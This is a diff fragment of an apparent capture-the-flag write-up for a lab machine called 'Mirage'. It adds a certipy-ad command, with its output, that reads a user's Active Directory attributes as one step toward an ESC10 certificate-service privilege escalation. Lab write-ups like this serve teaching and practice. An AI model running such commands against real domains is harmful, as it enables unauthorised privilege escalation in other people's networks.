@@ -842,7 +842,21 @@ So this is a good sign as this is a requirement for ESC10
 
 So looking at the wiki, all three conditions are met
 
+```python
+❯❯❯ faketime -f +7h certipy-ad account -u 'mirage-service$mirage.htb' -k -no-pass -dc-ip '10.129.232.163' -user 'mark.bbond' read -target dc01.mirage.htb
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
+[*] Reading attributes for 'mark.bbond':
+    cn                                  : mark.bbond
+    distinguishedName                   : CN=mark.bbond,OU=Users,OU=Support,OU=IT_Staff,DC=mirage,DC=htb
+    name                                : mark.bbond
+    objectSid                           : S-1-5-21-2127163471-3824721834-2568365109-1109
+    sAMAccountName                      : mark.bbond
+    userPrincipalName                   : mark.bbond@mirage.htb
+    userAccountControl                  : 66048
+    whenCreated                         : 2025-05-02T08:36:23+00:00
+    whenChanged                         : 2026-10-12T23:01:57+00:**00**
+```
 
 
 
